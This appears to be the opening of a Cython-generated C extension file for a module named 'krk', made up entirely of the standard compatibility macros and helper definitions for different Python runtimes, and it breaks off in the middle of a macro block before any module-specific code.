/* Generated by Cython 3.0.0 */

/* BEGIN: Cython Metadata
{
    "distutils": {
        "name": "krk",
        "sources": [
            "/storage/emulated/0/krk.py"
        ]
    },
    "module_name": "krk"
}
END: Cython Metadata */

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#if defined(CYTHON_LIMITED_API) && 0
  #ifndef Py_LIMITED_API
    #if CYTHON_LIMITED_API+0 > 0x03030000
      #define Py_LIMITED_API CYTHON_LIMITED_API
    #else
      #define Py_LIMITED_API 0x03030000
    #endif
  #endif
#endif

#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02070000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.7+ or Python 3.3+.
#else
#define CYTHON_ABI "3_0_0"
#define __PYX_ABI_MODULE_NAME "_cython_" CYTHON_ABI
#define __PYX_TYPE_MODULE_PREFIX __PYX_ABI_MODULE_NAME "."
#define CYTHON_HEX_VERSION 0x030000F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(_WIN32) && !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #define HAVE_LONG_LONG
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#if defined(GRAALVM_PYTHON)
  /* For very preliminary testing purposes. Most variables are set the same as PyPy.
     The existence of this section does not imply that anything works or is even tested */
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_TYPE_SPECS
  #define CYTHON_USE_TYPE_SPECS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_GIL
  #define CYTHON_FAST_GIL 0
  #undef CYTHON_METH_FASTCALL
  #define CYTHON_METH_FASTCALL 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS (PY_MAJOR_VERSION >= 3)
  #endif
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #undef CYTHON_USE_MODULE_STATE
  #define CYTHON_USE_MODULE_STATE 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYPY_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_TYPE_SPECS
  #define CYTHON_USE_TYPE_SPECS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_GIL
  #define CYTHON_FAST_GIL 0
  #undef CYTHON_METH_FASTCALL
  #define CYTHON_METH_FASTCALL 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS (PY_MAJOR_VERSION >= 3)
  #endif
  #if PY_VERSION_HEX < 0x03090000
    #undef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #elif !defined(CYTHON_PEP489_MULTI_PHASE_INIT)
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #undef CYTHON_USE_MODULE_STATE
  #define CYTHON_USE_MODULE_STATE 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1 && PYPY_VERSION_NUM >= 0x07030C00)
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(CYTHON_LIMITED_API)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 1
  #define CYTHON_COMPILING_IN_GRAAL 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_CLINE_IN_TRACEBACK
  #define CYTHON_CLINE_IN_TRACEBACK 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_TYPE_SPECS
  #define CYTHON_USE_TYPE_SPECS 1
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #endif
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_GIL
  #define CYTHON_FAST_GIL 0
  #undef CYTHON_METH_FASTCALL
  #define CYTHON_METH_FASTCALL 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS 1
  #endif
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_MODULE_STATE
  #define CYTHON_USE_MODULE_STATE 1
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #ifndef CYTHON_USE_TYPE_SPECS
    #define CYTHON_USE_TYPE_SPECS 0
  #endif
  #ifndef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #ifndef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #ifndef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_GIL
    #define CYTHON_FAST_GIL (PY_MAJOR_VERSION < 3 || PY_VERSION_HEX >= 0x03060000 && PY_VERSION_HEX < 0x030C00A6)
  #endif
  #ifndef CYTHON_METH_FASTCALL
    #define CYTHON_METH_FASTCALL (PY_VERSION_HEX >= 0x030700A1)
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL 1
  #endif
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS 1
  #endif
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #elif !defined(CYTHON_PEP489_MULTI_PHASE_INIT)
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_MODULE_STATE
    #define CYTHON_USE_MODULE_STATE 0
  #endif
  #if PY_VERSION_HEX < 0x030400a1
    #undef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 0
  #elif !defined(CYTHON_USE_TP_FINALIZE)
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #if PY_VERSION_HEX < 0x030600B1
    #undef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS 0
  #elif !defined(CYTHON_USE_DICT_VERSIONS)
    #define CYTHON_USE_DICT_VERSIONS  (PY_VERSION_HEX < 0x030C00A5)
  #endif
  #if PY_VERSION_HEX < 0x030700A3
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK 1
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if !defined(CYTHON_VECTORCALL)
#define CYTHON_VECTORCALL  (CYTHON_FAST_PYCCALL && PY_VERSION_HEX >= 0x030800B1)
#endif
#define CYTHON_BACKPORT_VECTORCALL (CYTHON_METH_FASTCALL && PY_VERSION_HEX < 0x030800B1)
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
  #if defined(__cplusplus)
    /* for clang __has_cpp_attribute(maybe_unused) is true even before C++17
     * but leads to warnings with -pedantic, since it is a C++17 feature */
    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)
      #if __has_cpp_attribute(maybe_unused)
        #define CYTHON_UNUSED [[maybe_unused]]
      #endif
    #endif
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
  #define CYTHON_MAYBE_UNUSED_VAR(x) CYTHON_UNUSED_VAR(x)
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
            typedef unsigned char     uint8_t;
            typedef unsigned short    uint16_t;
            typedef unsigned int      uint32_t;
        #else
            typedef unsigned __int8   uint8_t;
            typedef unsigned __int16  uint16_t;
            typedef unsigned __int32  uint32_t;
        #endif
    #endif
    #if _MSC_VER < 1300
        #ifdef _WIN64
            typedef unsigned long long  __pyx_uintptr_t;
        #else
            typedef unsigned int        __pyx_uintptr_t;
        #endif
    #else
        #ifdef _WIN64
            typedef unsigned __int64    __pyx_uintptr_t;
        #else
            typedef unsigned __int32    __pyx_uintptr_t;
        #endif
    #endif
#else
    #include <stdint.h>
    typedef uintptr_t  __pyx_uintptr_t;
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus)
    /* for clang __has_cpp_attribute(fallthrough) is true even before C++17
     * but leads to warnings with -pedantic, since it is a C++17 feature */
    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)
      #if __has_cpp_attribute(fallthrough)
        #define CYTHON_FALLTHROUGH [[fallthrough]]
      #endif
    #endif
    #ifndef CYTHON_FALLTHROUGH
      #if __has_cpp_attribute(clang::fallthrough)
        #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
      #elif __has_cpp_attribute(gnu::fallthrough)
        #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
      #endif
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif
#ifdef __cplusplus
  template <typename T>
  struct __PYX_IS_UNSIGNED_IMPL {static const bool value = T(0) < T(-1);};
  #define __PYX_IS_UNSIGNED(type) (__PYX_IS_UNSIGNED_IMPL<type>::value)
#else
  #define __PYX_IS_UNSIGNED(type) (((type)-1) > 0)
#endif
#if CYTHON_COMPILING_IN_PYPY == 1
  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x030A0000)
#else
  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000)
#endif
#define __PYX_REINTERPRET_FUNCION(func_pointer, other_pointer) ((func_pointer)(void(*)(void))(other_pointer))

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_DefaultClassType PyClass_Type
  #define __Pyx_PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int p, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject *co=NULL, *result=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(p))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto end;
        if (!(empty = PyTuple_New(0))) goto end;
        result = (PyCodeObject*) PyObject_Call(replace, empty, kwds);
    end:
        Py_XDECREF((PyObject*) co);
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return result;
    }
#elif PY_VERSION_HEX >= 0x030800B2 && !CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_NewWithPosOnlyArgs(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#else
  #define __Pyx_PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
#endif
#if PY_VERSION_HEX >= 0x030900A4 || defined(Py_IS_TYPE)
  #define __Pyx_IS_TYPE(ob, type) Py_IS_TYPE(ob, type)
#else
  #define __Pyx_IS_TYPE(ob, type) (((const PyObject*)ob)->ob_type == (type))
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_Is)
  #define __Pyx_Py_Is(x, y)  Py_Is(x, y)
#else
  #define __Pyx_Py_Is(x, y) ((x) == (y))
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsNone)
  #define __Pyx_Py_IsNone(ob) Py_IsNone(ob)
#else
  #define __Pyx_Py_IsNone(ob) __Pyx_Py_Is((ob), Py_None)
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsTrue)
  #define __Pyx_Py_IsTrue(ob) Py_IsTrue(ob)
#else
  #define __Pyx_Py_IsTrue(ob) __Pyx_Py_Is((ob), Py_True)
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsFalse)
  #define __Pyx_Py_IsFalse(ob) Py_IsFalse(ob)
#else
  #define __Pyx_Py_IsFalse(ob) __Pyx_Py_Is((ob), Py_False)
#endif
#define __Pyx_NoneAsNull(obj)  (__Pyx_Py_IsNone(obj) ? NULL : (obj))
#if PY_VERSION_HEX >= 0x030900F0 && !CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyObject_GC_IsFinalized(o) PyObject_GC_IsFinalized(o)
#else
  #define __Pyx_PyObject_GC_IsFinalized(o) _PyGC_FINALIZED(o)
#endif
#ifndef CO_COROUTINE
  #define CO_COROUTINE 0x80
#endif
#ifndef CO_ASYNC_GENERATOR
  #define CO_ASYNC_GENERATOR 0x200
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef Py_TPFLAGS_SEQUENCE
  #define Py_TPFLAGS_SEQUENCE 0
#endif
#ifndef Py_TPFLAGS_MAPPING
  #define Py_TPFLAGS_MAPPING 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_METH_FASTCALL
  #define __Pyx_METH_FASTCALL METH_FASTCALL
  #define __Pyx_PyCFunction_FastCall __Pyx_PyCFunctionFast
  #define __Pyx_PyCFunction_FastCallWithKeywords __Pyx_PyCFunctionFastWithKeywords
#else
  #define __Pyx_METH_FASTCALL METH_VARARGS
  #define __Pyx_PyCFunction_FastCall PyCFunction
  #define __Pyx_PyCFunction_FastCallWithKeywords PyCFunctionWithKeywords
#endif
#if CYTHON_VECTORCALL
  #define __pyx_vectorcallfunc vectorcallfunc
  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  PY_VECTORCALL_ARGUMENTS_OFFSET
